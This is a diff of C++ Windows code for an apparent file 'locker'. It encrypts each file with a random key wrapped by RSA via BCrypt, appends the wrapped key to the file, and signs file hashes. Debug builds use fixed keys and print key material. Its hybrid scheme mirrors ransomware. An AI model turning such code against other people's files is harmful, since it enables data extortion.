+		LOG_ERROR(L"[EncryptRSA] Invalid Size File < RSA_BYTE; %ls", FileInfo->Filename);
+		return FALSE;
 	}
-	size = FileInfo->Filesize;	
-	FileBuffer = (BYTE*)memory::m_malloc(dwDataLen + 32);
 
-	if (!ReadFile(FileInfo->FileHandle, FileBuffer, size, &size, NULL))
+	BYTE* FileBuffer = (BYTE*)memory::m_malloc(FileInfo->CryptInfo->desc.size);
+
+	if (!ReadFile(FileInfo->FileHandle, FileBuffer, FileInfo->Filesize, &size, NULL) || FileInfo->Filesize != size)
 	{
-		LOG_ERROR(L"File %ls is failed to ReadFile. GetLastError = %lu\n", FileInfo->Filename, GetLastError());
+		LOG_ERROR(L"[EncryptRSA] Failed File ReadFile; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
 		goto END;
 	}
 	
 
 	if (global::GetDeCrypt() == EncryptCipher::CRYPT)
 	{
-		if (!CryptEncrypt(RsaKey, 0, TRUE, 0, FileBuffer, &size, dwDataLen))
+		if(!HandleError
+		(
+			BCryptEncrypt
+			(
+				FileInfo->CryptInfo->desc.handle_rsa_key,
+				FileBuffer, FileInfo->Filesize,
+				NULL, NULL, 0,
+				FileBuffer, FileInfo->CryptInfo->desc.size, &dwDataLen, BCRYPT_PAD_PKCS1))
+			)
 		{
-			LOG_ERROR(L"Failed CryptEncrypt. GetLastError = %lu\n", GetLastError());
-			LOG_ERROR(L"NTE_BAD_LEN - %lu\tRSA_BIT > FILESIZE\n", NTE_BAD_LEN);
+			LOG_ERROR(L"[CryptEncrypt] Failed; %ls", FileInfo->Filename);			
 			goto END;
 		}
 	}
 	else if (global::GetDeCrypt() == EncryptCipher::DECRYPT)
 	{
-		if (!CryptDecrypt(RsaKey, 0, TRUE, 0, FileBuffer, &size))
+		if (!HandleError
+		(
+			BCryptDecrypt
+			(
+				FileInfo->CryptInfo->desc.handle_rsa_key,
+				FileBuffer, FileInfo->CryptInfo->desc.size,
+				NULL, NULL, 0,
+				FileBuffer, FileInfo->CryptInfo->desc.size, &dwDataLen,
+				BCRYPT_PAD_PKCS1))
+			)
 		{
-			LOG_ERROR(L"Failed CryptDecrypt. GetLastError = %lu\n", GetLastError());
-			LOG_ERROR(L"NTE_BAD_LEN - %lu\tRSA_BIT > FILESIZE\n", NTE_BAD_LEN);
+			LOG_ERROR(L"[BCryptDecrypt] Failed");
 			goto END;
-		}
+		}		
 	}
 
-	if (!WriteFullData(FileInfo->newFileHandle, FileBuffer, size))
+	if (!WriteFullData(FileInfo->newFileHandle, FileBuffer, dwDataLen))
 	{
-		LOG_ERROR(L"Failed to write. GetLastError = %lu\n", GetLastError());
+		LOG_ERROR(L"[WriteFullData] Failed to write. GetLastError = %lu\n", GetLastError());
 		goto END;
 	}
 	
 	SUCCESS_return = TRUE;
 	
-END:
-	memory::memzero_explicit(BuffKey, 4096);
+END:	
 	if (FileBuffer)
 	{
-		memory::memzero_explicit(FileBuffer, dwDataLen);
+		memory::memzero_explicit(FileBuffer, FileInfo->CryptInfo->desc.size);
 		memory::m_free(FileBuffer);
 	}
-	if (RsaKey)
-		CryptDestroyKey(RsaKey);
-	if (CryptoProvider)
-		CryptReleaseContext(CryptoProvider, 0);		
-
+	
 	return SUCCESS_return;
 }
 
@@ -931,37 +1054,84 @@ END:
 
 STATIC BOOL GenKey
 (
-	PFILE_INFO FileInfo,
-	HCRYPTPROV Provider,
-	HCRYPTKEY PublicKey,
+	PFILE_INFO FileInfo,	
 	BYTE* CryptKey,
 	BYTE* CryptIV,
-	BYTE* EncryptedKey,
-	size_t BuffLenBytes
+	BYTE* EncryptedKey
 )
 {
-	DWORD dwDataLen = 40;
+	DWORD writeData = 0;
 
-	if (!CryptGenRandom(Provider, 32, CryptKey))
+	if (!HandleError
+	(BCryptGenRandom(0, CryptKey, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG)))
 	{
+		LOG_ERROR(L"[BCryptGenRandom] Failed");
 		return FALSE;
 	}
 
-	if (!CryptGenRandom(Provider, 8, CryptIV))
+	if (!HandleError
+	(BCryptGenRandom(0, CryptIV, 8, BCRYPT_USE_SYSTEM_PREFERRED_RNG)))
 	{
+		LOG_ERROR(L"[BCryptGenRandom] Failed");
 		return FALSE;
 	}
 	
-	FileInfo->CryptInfo->gen_key_method(FileInfo->CryptInfo->ctx, CryptKey, CryptIV);
 
+#ifdef DEBUG
+	memcpy(CryptKey, "________________________________", 32);
+	memcpy(CryptIV, "11111111", 8);
+#endif
+
+	FileInfo->CryptInfo->gen_key_method(FileInfo->ctx, CryptKey, CryptIV);	
+	
 	memory::Copy(EncryptedKey, CryptKey, 32);
 	memory::Copy(EncryptedKey + 32, CryptIV, 8);
 
-	if (!CryptEncrypt(PublicKey, 0, TRUE, 0, EncryptedKey, &dwDataLen, BuffLenBytes))
+#ifdef DEBUG
+	printf("KEY_TO_CRYPT\n");
+	for (size_t i = 0; i < 40; ++i)
+		printf_s("%02X", EncryptedKey[i]);
+	printf_s("\nENDKEY\n");
+
+	if (!HandleError
+	(
+		BCryptEncrypt
+		(
+			FileInfo->CryptInfo->desc.handle_rsa_key,
+			EncryptedKey, 512,
+			NULL, NULL, 0,
+			EncryptedKey, FileInfo->CryptInfo->desc.size, &writeData, BCRYPT_PAD_NONE))		
+		)
 	{
-		LOG_ERROR(L"Failed crypt RSA key. GetLastError = %lu.\n", GetLastError());
+		LOG_ERROR(L"Failed crypt RSA key. GetLastError = %lu.", GetLastError());
 		return FALSE;
 	}
+
+	for (size_t i = 0; i < writeData; ++i)
+		printf_s("%02X", EncryptedKey[i]);
+	printf_s("\n");
+#endif
+	
+	if (!HandleError
+	(
+		BCryptEncrypt
+		(
+			FileInfo->CryptInfo->desc.handle_rsa_key,
+			EncryptedKey, 40,
+			NULL, NULL, 0,
+			EncryptedKey, FileInfo->CryptInfo->desc.size, &writeData, BCRYPT_PAD_PKCS1))
+		)
+	{
+		LOG_ERROR(L"[BCryptEncrypt] Failed");
+		return FALSE;
+	}
+		
+
+#ifdef DEBUG
+	for (size_t i = 0; i < writeData; ++i)
+		printf_s("%02X", EncryptedKey[i]);
+	printf_s("\n");
+#endif
 
 	return TRUE;
 }
@@ -970,103 +1140,72 @@ STATIC BOOL GenKey
 STATIC BOOL WriteEncryptInfo
 (
 	PFILE_INFO FileInfo,
-	BYTE* EncryptedKey,
-	size_t size,
+	BYTE* EncryptedKey,	
 	EncryptModes EncryptMode
 )
 {
-	BYTE Buffer[4];
-	memset((VOID*)Buffer, 0, 4);
-	Buffer[0] = static_cast<INT>(EncryptMode) + 100;
-	std::string strbit = std::to_string((size + 1) << 31 | (size + 1) >> 1);
+	
+	BYTE Buffer[4] = { 0 };
+	Buffer[0] = static_cast<INT>(EncryptMode) + 100;	
+	std::string strbit = std::to_string(FileInfo->CryptInfo->desc.size);
 	memcpy_s((VOID*)&Buffer[1], 3, strbit.c_str(), strbit.size());
 	LARGE_INTEGER Offset;
 	Offset.QuadPart = 0;
 	
 	if (!SetFilePointerEx(FileInfo->newFileHandle, Offset, NULL, FILE_END))
 	{
-		LOG_ERROR(L"Failed write key for file %ls. GetLastError = %lu", FileInfo->Filename, GetLastError());
+		LOG_ERROR(L"[WriteEncryptInfo] Failed to write info; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
 		return FALSE;
 	}
 
-	if (!WriteFullData(FileInfo->newFileHandle, EncryptedKey, size))
+	if (!WriteFullData(FileInfo->newFileHandle, EncryptedKey, FileInfo->CryptInfo->desc.size))
 	{
-		LOG_ERROR(L"Failed write key for file %ls. GetLastError = %lu", FileInfo->Filename, GetLastError());
+		LOG_ERROR(L"[WriteEncryptInfo] Failed to write info; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
 		return FALSE;
 	}
 
 	if (!WriteFullData(FileInfo->newFileHandle, Buffer, 4))
 	{
-		LOG_ERROR(L"Failed write key for file %ls. GetLastError = %lu", FileInfo->Filename, GetLastError());
+		LOG_ERROR(L"[WriteEncryptInfo] Failed to write info; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
 		return FALSE;
 	}
 
 	return TRUE;
 }
 
-// Race Condition with lib CryptApi; TODO: rewrite with BCryptApi(CNG)
-std::mutex mtx;
 BOOL filesystem::FileCryptEncrypt
 (
-	PFILE_INFO FileInfo,
-	WCHAR* KeyFile
+	PFILE_INFO FileInfo
 )
 {
-	HCRYPTPROV CryptoProvider = 0;
-	HCRYPTKEY RsaKey = 0;	
-	BOOL SUCCESS_return = FALSE;
-	BYTE* EncryptedKey = NULL;	
-	DWORD size = 0;	
-	BYTE PublicKey[4096] = { 0 };
+	BOOL SUCCESS_return = FALSE;		
 	EncryptModes mode = global::GetEncMode();
-	mtx.lock();
-
-	if (!ReadRSAFile(KeyFile, PublicKey, &RsaKey, &CryptoProvider))
-	{
-		LOG_ERROR(L"Failed get RSA File - %ls. GetLastError = %lu.\n", KeyFile, GetLastError());
-		mtx.unlock();
-		return FALSE;
-	}
-
-	CryptEncrypt(RsaKey, 0, TRUE, 0, NULL, &size, 0);
-	if (size == 0)
-	{
-		LOG_ERROR(L"Failed get LenthBitRSA %ls. GetLastError = %lu.\n", FileInfo->Filename, GetLastError());
-		mtx.unlock();
-		goto END;
-	}
-	size += 13;
-	EncryptedKey = (BYTE*)memory::m_malloc(size);
+	
+	BYTE* EncryptedKey = (BYTE*)memory::m_malloc(FileInfo->CryptInfo->desc.size);
 	BYTE CryptIV[8];
 	BYTE CryptKey[32];
-	
-	if (!GenKey(FileInfo, CryptoProvider, RsaKey, CryptKey, CryptIV, EncryptedKey, size)) // походу это
+
+
+	if (!GenKey(FileInfo, CryptKey, CryptIV, EncryptedKey))
 	{
-		LOG_ERROR(L"Can't gen key for file %ls. GetLastError = %lu.\n", FileInfo->Filename, GetLastError());
-		mtx.unlock();
+		LOG_ERROR(L"[GenKey] Failed to generate key; %ls");
 		goto END;
 	}
-	mtx.unlock();
-
-
+	
 	if (!OptionEncryptMode(FileInfo, mode))
 		goto END;
-	WriteEncryptInfo(FileInfo, EncryptedKey, size, mode);
+
+	WriteEncryptInfo(FileInfo, EncryptedKey, mode);
 	
 	SUCCESS_return = TRUE;
 END:
-	memory::memzero_explicit(PublicKey, 4096);
 	if (EncryptedKey)
 	{
-		memory::memzero_explicit(EncryptedKey, size);
+		memory::memzero_explicit(EncryptedKey, FileInfo->CryptInfo->desc.size);
 		memory::memzero_explicit(CryptIV, 8);
 		memory::memzero_explicit(CryptKey, 32);
 		memory::m_free(EncryptedKey);
-	}	
-	if (RsaKey)
-		CryptDestroyKey(RsaKey);
-	if (CryptoProvider)
-		CryptReleaseContext(CryptoProvider, 0);	
+	}
 
 	return SUCCESS_return;
 }
@@ -1085,42 +1224,45 @@ STATIC BYTE* ReadEncryptInfo
 
 	if (!SetFilePointerEx(handle, Offset, NULL, FILE_END))
 	{
-		LOG_ERROR(L"Failed read file info. GetLastError = %lu\n", GetLastError());
+		LOG_ERROR(L"[ReadEncryptInfo] Failed to read file info. GetLastError = %lu", GetLastError());
 		return NULL;
 	}
 	BYTE ReadInfo[4];
 	if (!ReadFile(handle, ReadInfo, 4, NULL, NULL))
 	{
-		LOG_ERROR(L"Failed read file info. GetLastError = %lu\n", GetLastError());
+		LOG_ERROR(L"[ReadEncryptInfo] Failed to read file info. GetLastError = %lu", GetLastError());
 		return NULL;
 	}
 	
 	INT mode = ReadInfo[0] - 100;
 	INT size_bit = 0;
 	for (int i = 1; i < 4; ++i)
-		size_bit = size_bit * 10 + (ReadInfo[i] - '0');
-	size_bit = size_bit << 1 | size_bit >> (31);
-	size_bit -= 1;
+		size_bit = size_bit * 10 + (ReadInfo[i] - '0');		
 	BYTE* read_key = (BYTE*)memory::m_malloc(size_bit);	
 	Offset.QuadPart = -(size_bit + 4);
 	if (!SetFilePointerEx(handle, Offset, NULL, FILE_END))
 	{
-		LOG_ERROR(L"Failed read file info. GetLastError = %lu\n", GetLastError());
+		LOG_ERROR(L"[ReadEncryptInfo] Failed to read file info. GetLastError = %lu", GetLastError());
 		return NULL;
 	}
-	if (!ReadFile(handle, read_key, size_bit - 4, NULL, NULL))
+	if (!ReadFile(handle, read_key, size_bit, NULL, NULL))
 	{
-		LOG_ERROR(L"Failed read file info. GetLastError = %lu\n", GetLastError());
+		LOG_ERROR(L"[ReadEncryptInfo] Failed to read file info. GetLastError = %lu", GetLastError());
 		return NULL;
 	}
 	Offset.QuadPart = 0;
 	if (!SetFilePointerEx(handle, Offset, NULL, FILE_BEGIN))
 	{
-		LOG_ERROR(L"Failed read file info. GetLastError = %lu\n", GetLastError());
+		LOG_ERROR(L"[ReadEncryptInfo] Failed to read file info. GetLastError = %lu", GetLastError());
 		return NULL;
 	}
+#ifdef DEBUG
+	for (size_t i = 0; i < size_bit; ++i)
+		printf_s("%02X", read_key[i]);
+	printf_s("\n");
+#endif
 	
-	*Bit = size_bit + 4;
+	*Bit = size_bit + 4;	
 	*mode_ = static_cast<EncryptModes>(mode);
 	return read_key;
 }
@@ -1128,28 +1270,16 @@ STATIC BYTE* ReadEncryptInfo
 
 BOOL filesystem::FileCryptDecrypt
 (
-	PFILE_INFO FileInfo,
-	WCHAR* KeyFile	
+	PFILE_INFO FileInfo
 )
 {
-	BOOL SUCCESS_return = FALSE;
-	HCRYPTPROV CryptoProvider = 0;
-	HCRYPTKEY RsaKey = 0;
-	BYTE* EncryptedKey = NULL;
-	DWORD EncryptedKeySize = 0;		
-	DWORD cat;
-	BYTE PrivateKey[4096] = { 0 };
-
-	DWORD dwDataLen = 0;
+	BOOL SUCCESS_return = FALSE;	
+	DWORD EncryptedKeySize = 0;
+	DWORD written;		
 	EncryptModes mode = global::GetEncMode();
-	
-	if (!ReadRSAFile(KeyFile, PrivateKey, &RsaKey, &CryptoProvider))
-	{
-		LOG_ERROR(L"Failed get RSA File - %ls. GetLastError = %lu.\n", KeyFile, GetLastError());
-		return FALSE;
-	}	
-
-	EncryptedKey = ReadEncryptInfo(FileInfo->FileHandle, &EncryptedKeySize, &mode);
+	BYTE CryptIV[8];
+	BYTE CryptKey[32];
+	BYTE* EncryptedKey = ReadEncryptInfo(FileInfo->FileHandle, &EncryptedKeySize, &mode);
 	if (EncryptedKey == NULL)	goto END;
 	FileInfo->Filesize -= EncryptedKeySize;
 	if (SetFilePointer(FileInfo->FileHandle, -(LONG)EncryptedKeySize, NULL, FILE_END))
@@ -1157,44 +1287,53 @@ BOOL filesystem::FileCryptDecrypt
 		SetEndOfFile(FileInfo->FileHandle);
 		SetFilePointer(FileInfo->FileHandle, 0, NULL, FILE_BEGIN);
 	}
-	if (!CryptDecrypt(RsaKey, 0, TRUE, 0, EncryptedKey, &EncryptedKeySize))	
+	
+	if (!HandleError
+	(
+		BCryptDecrypt(FileInfo->CryptInfo->desc.handle_rsa_key,
+			EncryptedKey, FileInfo->CryptInfo->desc.size,
+			NULL, NULL, 0,
+			EncryptedKey, 40, &written,
+			BCRYPT_PAD_PKCS1))
+		)
 	{
-		LOG_ERROR(L"Failed CryptDecrypt. GetLastError = %lu\n", GetLastError());
+		LOG_ERROR(L"[BCryptDecrypt] Failed");		
 		goto END;
 	}
+	
 
-
-	BYTE CryptIV[8];
-	BYTE CryptKey[32];
+#ifdef DEBUG
+	printf("ECNRYPTED_KEY\n");
+	for (size_t i = 0; i < 40; ++i)
+		printf_s("%02X", EncryptedKey[i]);
+	printf_s("\n");
+#endif
 
 	memory::Copy(CryptKey, EncryptedKey, 32);
 	memory::Copy(CryptIV, EncryptedKey + 32, 8);	
-	FileInfo->CryptInfo->gen_key_method(FileInfo->CryptInfo->ctx, CryptKey, CryptIV);	
+	FileInfo->CryptInfo->gen_key_method(FileInfo->ctx, CryptKey, CryptIV);
 	
+
 	if (!OptionEncryptMode(FileInfo, mode))
 		goto END;
 	
 	SUCCESS_return = TRUE;
-END:	
-	memory::memzero_explicit(PrivateKey, 4096);
+END:		
 	if (EncryptedKey)
 	{
-		memory::memzero_explicit(EncryptedKey, EncryptedKeySize);
+		memory::memzero_explicit(EncryptedKey, written);
 		memory::memzero_explicit(CryptKey, 32);
 		memory::memzero_explicit(CryptIV, 8);
 		memory::m_free(EncryptedKey);
 	}
-	if (RsaKey)
-		CryptDestroyKey(RsaKey);
-	if (CryptoProvider)
-		CryptReleaseContext(CryptoProvider, 0);
 	
 	return SUCCESS_return;
 }
 
 
 STATIC VOID dump_hash(CONST BYTE* hash, size_t len) 
-{	
+{		
+	std::lock_guard<std::mutex> lock(g_MutexBcrypt);
 	for (size_t i = 0; i < len; ++i) printf("%02X", hash[i]);
 	printf("\n");
 }
@@ -1209,28 +1348,36 @@ VOID filesystem::sort_hash_list(SLIST<HASH_LIST>* list)
 	
 	for (auto& e : map)
 	{
-		locker::PHLIST hash_sorted = new locker::HLIST;		
+		locker::PHLIST hash_sorted = new locker::HLIST;
 		hash_sorted->hash = e.second;
 		hash_sorted->hash_size = 32;
 		list_sorted->SLIST_INSERT_HEAD(hash_sorted);
 	}
 
-
 	*list = *list_sorted;
+
+#ifdef DEBUG
+	printf("DumpHash\n");
+	DataHash = NULL;
+	SLIST_FOREACH(DataHash, list)
+		dump_hash(DataHash->hash, 32);
+
+	printf("\n\n");
+#endif
 }
 
 
 BOOL filesystem::HashSignatureFile
 (
 	SLIST<HASH_LIST>* list,	
-	PFILE_INFO FileInfo
+	HANDLE HandleHash
 )
 {
 	DWORD BytesRead;
-	CHAR* Buffer = (CHAR*)memory::m_malloc(1048576); // 1 MB
+	BYTE* Buffer = (BYTE*)memory::m_malloc(1048576);
 	if (!Buffer)
 	{
-		LOG_ERROR(L"Failed HashSignatureFile - alloc memory\n");
+		LOG_ERROR(L"[HashSignatureFile] Failed alloc memory");
 		return FALSE;
 	}	
 	
@@ -1238,14 +1385,14 @@ BOOL filesystem::HashSignatureFile
 	sha256_init_context(&ctx);
 	size_t hash_s = 32;
 	BYTE* out = (BYTE*)memory::m_malloc(hash_s);
-
-	while (ReadFile(FileInfo->FileHandle, Buffer, 1048576, &BytesRead, NULL) && BytesRead != 0)
-		sha256_update_context(&ctx, (CONST u8*)Buffer, BytesRead);
+	SetFilePointer(HandleHash, 0, NULL, FILE_BEGIN);
+	while (ReadFile(HandleHash, Buffer, 1048576, &BytesRead, NULL) && BytesRead != 0)
+		sha256_update_context(&ctx, Buffer, BytesRead);
 
 	sha256_final_context(&ctx, out);
-		
+	
 
-	locker::PHLIST hash = new locker::HLIST;
+	HLIST* hash = new HLIST;
 	hash->hash = out;
 	hash->hash_size = hash_s;
 	list->SLIST_INSERT_HEAD_SAFE(hash);
@@ -1257,279 +1404,288 @@ BOOL filesystem::HashSignatureFile
 
 BOOL filesystem::CreateSignatureFile
 (
-	SLIST<HASH_LIST>* HashList,
-	WCHAR* SignatureName,
-	BYTE* SignatureRoot,
-	DWORD sig_len
+	SLIST<HASH_LIST>* HashList
 )
-{
-	VER = TRUE;
-	PHASH_LIST DataHash = NULL;
-	HANDLE hFile = NULL;
+{	
 	BOOL success = FALSE;
+	NTSTATUS status;
+	PHASH_LIST DataHash = NULL;
+	FILE_INFO FileInfo{};
+	CRYPT_INFO CryptInfo = {};
 
-	WCHAR* locale_hash = (WCHAR*)memory::m_malloc((MAX_PATH + MAX_PATH) * sizeof(WCHAR));
-	DWORD len = GetCurrentDirectoryW(MAX_PATH, locale_hash);
-	if(!SignatureName)
-		wmemcpy_s(&locale_hash[memory::StrLen(locale_hash)], 20, L"\\signature.laced.txt", 20);
-	else 
-		wmemcpy_s(&locale_hash[memory::StrLen(locale_hash)], memory::StrLen(SignatureName), SignatureName, memory::StrLen(SignatureName));
+	WCHAR* PathLocale = NULL;
+	DWORD len = 0;
+	
+	BYTE* SignatureBuffer = NULL;
+	DWORD ResultLength = 0;
 
-	BYTE HASH_SHA[32];
-	sha256_state ctx;
-	sha256_init_context(&ctx);	
-	SLIST_FOREACH(DataHash, HashList)
-		sha256_update_context(&ctx, (CONST u8*)DataHash->hash, DataHash->hash_size);		
-	sha256_final_context(&ctx, HASH_SHA);
-
-	HCRYPTPROV CryptoProvider = 0;
-	HCRYPTKEY RsaKey = 0;
-	HCRYPTHASH hHash = 0;	
-	BYTE* signature = NULL;
-
-	if (SignatureRoot == NULL)
+	if (global::GetPathSignRSAKey() == NULL)
 	{
-		signature = (BYTE*)memory::m_malloc(4096);
-		if (!ReadRSAFile(global::GetPathSignRSAKey(), signature, &RsaKey, &CryptoProvider))
-		{
-			LOG_ERROR(L"Failed get RSA File - %ls. GetLastError = %lu.\n", global::GetPathSignRSAKey(), GetLastError());
-			goto END;
-		}
-		sig_len = 4096;
+		LOG_ERROR(L"[CreateSignatureFile] Failed; missing path key to signature");
+		return FALSE;
 	}
-	else
-	{		
-		signature = SignatureRoot;
-		if (!CryptAcquireContextA(&CryptoProvider, NULL, NULL, PROV_RSA_AES, 0))
-		{
-			LOG_ERROR(L"Failed create provider. GetLastError = %lu.\n", GetLastError());
-			return FALSE;
-		}
 		
-		if (!CryptImportKey(CryptoProvider, SignatureRoot, sig_len, 0, 0, &RsaKey))
-		{
-			LOG_ERROR(L"CryptImportKey failed. GetLastError() = %lu\n", GetLastError());
-			return FALSE;
-		}
+	CryptInfo.desc.key_data = (BYTE*)memory::m_malloc(4096);
+	CryptInfo.desc.crypto_provider = NULL;
+	CryptInfo.desc.handle_rsa_key = NULL;
+	CryptInfo.desc.rsa_path = global::GetPathSignRSAKey();
+	global::SetDeCrypt(EncryptCipher::DECRYPT);
+	if (!ReadRSAFile(&CryptInfo))
+	{
+		LOG_ERROR(L"[ReadRSAFile] Failed; %ls", CryptInfo.desc.rsa_path);		
+		goto end;
 	}
-	
-	if (!CryptCreateHash(CryptoProvider, CALG_SHA_256, 0, 0, &hHash)) 
+	if (CryptInfo.desc.crypto_provider == NULL || CryptInfo.desc.handle_rsa_key == NULL)
 	{
-		LOG_ERROR(L"FailedCryptCreateHash. GetLastError = %lu.\n", GetLastError());
-		goto END;
-	}
-	if (!CryptHashData(hHash, HASH_SHA, 32, 0)) 
-	{
-		LOG_ERROR(L"Failed CryptHashData. GetLastError = %lu\n", GetLastError());
-		goto END;
-	}	
-	
-	if (!CryptSignHashA(hHash, AT_KEYEXCHANGE, NULL, 0, signature, &sig_len)) 	
-	{
-		LOG_ERROR(L"Failed CryptSignHash. GetLastError() =  %lu\n", GetLastError());
-		goto END;
-	}
-	
-
-	hFile = CreateFileW(locale_hash, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
-	if (hFile == INVALID_HANDLE_VALUE)
-	{
-		LOG_ERROR(L"Failed Create File %ls\n", locale_hash);
-		goto END;
+		LOG_ERROR(L"[DESCRIPTOR - PROVIDER] Failed; %ls", CryptInfo.desc.rsa_path);		
+		goto end;
 	}
 
-	if (!WriteFullData(hFile, signature, sig_len))
+
+	PathLocale = (WCHAR*)memory::m_malloc((MAX_PATH + MAX_PATH) * sizeof(WCHAR));
+	len = GetCurrentDirectoryW(MAX_PATH, PathLocale);
+	if (!len)
 	{
-		LOG_ERROR(L"Failed WriteFullData. GetLastError = %lu\n", GetLastError());
-		goto END;
+		LOG_ERROR(L"[CreateSignatureFile] [GetCurrentDirectoryW] Failed");
+		goto end;
+	}
+	wmemcpy(&PathLocale[len], L"\\signature.laced.txt", 20);
+	FileInfo.newFilename = PathLocale;
+	if (!CreateFileOpen(&FileInfo, CREATE_ALWAYS) || FileInfo.newFileHandle == INVALID_HANDLE_VALUE)
+	{
+		LOG_ERROR(L"[CreateSignatureFile] Failed; %ls", PathLocale);
+		goto end;
 	}
 	
-	if(!SignatureName)
-		printf("Crypted Hash Sum saved in: %ls\n", locale_hash);
-	else
-		printf("Crypted hash of public key saved in: %ls\n", SignatureName);
+	BYTE hash_sha[32];
+	{
+		sha256_state ctx;
+		sha256_init_context(&ctx);
+		SLIST_FOREACH(DataHash, HashList)
+			sha256_update_context(&ctx, DataHash->hash, DataHash->hash_size);
+		sha256_final_context(&ctx, hash_sha);
+	}
+	LOG_INFO(L"[CreateSignatureFile] Dump Hash");
+	dump_hash(hash_sha, 32);
+	
+	SignatureBuffer = (BYTE*)memory::m_malloc(CryptInfo.desc.size);
+	if (SignatureBuffer == NULL)
+	{
+		LOG_ERROR(L"[BAD_ALLOC] Failed");
+		goto end;
+	}
 
+	BCRYPT_PKCS1_PADDING_INFO paddingInfo;
+	paddingInfo.pszAlgId = BCRYPT_SHA256_ALGORITHM;
+
+	if (!HandleError
+	(
+			BCryptSignHash
+			(
+				CryptInfo.desc.handle_rsa_key, &paddingInfo,
+				hash_sha, 32,
+				SignatureBuffer, CryptInfo.desc.size,
+				&ResultLength, 
+				BCRYPT_PAD_PKCS1)
+			)
+		)
+	{
+		LOG_ERROR(L"[BCryptSignHash] Failed");
+		goto end;
+	}
+#ifdef DEBUG
+	printf("DumpInfo\n");
+	dump_hash(SignatureBuffer, ResultLength);
+#endif 
+
+	if (!WriteFullData(FileInfo.newFileHandle, SignatureBuffer, ResultLength))
+	{
+		LOG_ERROR(L"[CreateSignatureFile] [WriteFullData] Failed; %ls; GetLastError = %lu", PathLocale, GetLastError());
+		goto end;
+	}
+
+	LOG_SUCCESS(L"[CreateSignatureFile] SUCCESS; Signature saved in: %ls", PathLocale);
 	success = TRUE;
-	
-END:
-	if(hFile) CloseHandle(hFile);
-	if(hHash) CryptDestroyHash(hHash);
-	if (RsaKey) CryptDestroyKey(RsaKey);
-	if (CryptoProvider) CryptReleaseContext(CryptoProvider, 0);
-	memory::m_free(locale_hash);
-	if (!SignatureRoot && signature)
-		memory::m_free(signature);
+end:
+	if(SignatureBuffer)
+		memory::m_free(SignatureBuffer);
+	if (PathLocale)
+		memory::m_free(PathLocale);
+	if (CryptInfo.desc.key_data)
+	{
+		memory::memzero_explicit(CryptInfo.desc.key_data, 4096);
+		memory::m_free(CryptInfo.desc.key_data);
+	}
+	if (FileInfo.newFileHandle)
+		CloseHandle(FileInfo.newFileHandle);
 
 	return success;
 }
 
 BOOL filesystem::VerificationSignatureFile
 (
-	SLIST<HASH_LIST>* HashList,
-	WCHAR* SignatureName,
-	BYTE* SignatureRoot,
-	DWORD sig_len
+	SLIST<HASH_LIST>* HashList	
 )
 {
-	VER = TRUE;
 	BOOL success = FALSE;
-	HANDLE hFile = NULL;
-	locker::FILE_INFO FileInfo;
+	NTSTATUS status;
 	PHASH_LIST DataHash = NULL;
-	DWORD dwread;
-	BYTE* Buffer = NULL;
+	FILE_INFO FileInfo{};
+	CRYPT_INFO CryptInfo = {};
 
-	HCRYPTPROV CryptoProvider = 0;
-	HCRYPTKEY RsaKey = 0;
-	HCRYPTHASH hHash = 0;
+	WCHAR* PathLocale = NULL;
+	DWORD len = 0;
 
-	BYTE HASH_SHA[32] = { 0 };
+	DWORD SignatureLength = 0;
+	BYTE* SignatureBuffer = NULL;	
 
-	BYTE* key = NULL;
-	if (!SignatureRoot)
+	if (global::GetPathSignRSAKey() == NULL)
 	{
-		key = (BYTE*)memory::m_malloc(4096);
-		if (!ReadRSAFile(global::GetPathSignRSAKey(), key, &RsaKey, &CryptoProvider))
-		{
-			LOG_ERROR(L"Failed get RSA File - %ls. GetLastError = %lu.\n", global::GetPathSignRSAKey(), GetLastError());
-			return FALSE;
-		}
+		LOG_ERROR(L"[CreateSignatureFile] Failed; missing path key to signature");
+		return FALSE;
+	}
+
+	CryptInfo.desc.key_data = (BYTE*)memory::m_malloc(4096);
+	CryptInfo.desc.crypto_provider = NULL;
+	CryptInfo.desc.handle_rsa_key = NULL;
+	CryptInfo.desc.rsa_path = global::GetPathSignRSAKey();
+	global::SetDeCrypt(EncryptCipher::CRYPT);
+	if (!ReadRSAFile(&CryptInfo))
+	{
+		LOG_ERROR(L"[ReadRSAFile] Failed; %ls", CryptInfo.desc.rsa_path);
+		goto end;
+	}
+	if (CryptInfo.desc.crypto_provider == NULL || CryptInfo.desc.handle_rsa_key == NULL)
+	{
+		LOG_ERROR(L"[DESCRIPTOR - PROVIDER] Failed; %ls", CryptInfo.desc.rsa_path);
+		goto end;
+	}
+
+	PathLocale = (WCHAR*)memory::m_malloc((MAX_PATH + MAX_PATH) * sizeof(WCHAR));
+	len = GetCurrentDirectoryW(MAX_PATH, PathLocale);
+	if (!len)
+	{
+		LOG_ERROR(L"[VerificationSignatureFile] [GetCurrentDirectoryW] Failed");
+		goto end;
+	}
+	wmemcpy(&PathLocale[len], L"\\signature.laced.txt", 20);
+	FileInfo.FilePath = PathLocale;
+	if (!getParseFile(&FileInfo) || FileInfo.FileHandle == INVALID_HANDLE_VALUE)
+	{
+		LOG_ERROR(L"[VerificationSignatureFile] [getParseFile] Failed; %ls", PathLocale);
+		goto end;
+	}
+
+	SignatureBuffer = (BYTE*)memory::m_malloc(FileInfo.Filesize);	
+	if(!ReadFile(FileInfo.FileHandle, SignatureBuffer, FileInfo.Filesize, &SignatureLength, NULL) && SignatureLength != 0)
+	{
+		LOG_ERROR(L"[VerificationSignatureFile] [ReadFile] Failed; %ls; GetLastError = %lu", PathLocale, GetLastError());
+		goto end;
+	}
+
+	BYTE hash_sha[32];
+	{
+		sha256_state ctx;
+		sha256_init_context(&ctx);
+		SLIST_FOREACH(DataHash, HashList)
+			sha256_update_context(&ctx, DataHash->hash, DataHash->hash_size);
+		sha256_final_context(&ctx, hash_sha);
+	}
+
+	LOG_INFO(L"[VerificationSignatureFile] Dump Hash");
+	dump_hash(hash_sha, 32);
+
+	BCRYPT_PKCS1_PADDING_INFO paddingInfo;
+	paddingInfo.pszAlgId = BCRYPT_SHA256_ALGORITHM;		
+	if (!HandleError
+		(
+			status = BCryptVerifySignature
+			(
+				CryptInfo.desc.handle_rsa_key, &paddingInfo,
+				hash_sha, 32,
+				SignatureBuffer, SignatureLength, 
